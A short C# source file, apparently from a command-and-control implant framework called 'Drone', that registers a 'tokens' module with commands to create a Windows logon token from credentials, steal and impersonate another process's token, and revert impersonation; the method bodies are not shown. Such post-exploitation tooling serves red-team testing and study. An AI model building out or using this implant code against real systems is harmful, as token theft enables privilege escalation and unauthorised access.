using Drone.Modules;

namespace TokenModule;

public partial class TokenModule : DroneModule
{
    public override string Name => "tokens";

    public override List<Command> Commands => new()
    {
        new Command("make-token", "Create and impersonate a token with the given credentials", MakeToken,
            new List<Command.Argument>
            {
                new("DOMAIN\\username", false),
                new("password")
            }),
        new Command("steal-token", "Duplicate and impersonate the token of the given process", StealToken,
            new List<Command.Argument>
            {
                new("pid", false)
            }),
        new Command("rev2self", "Drop token impersonation", RevertToSelf)
    };
}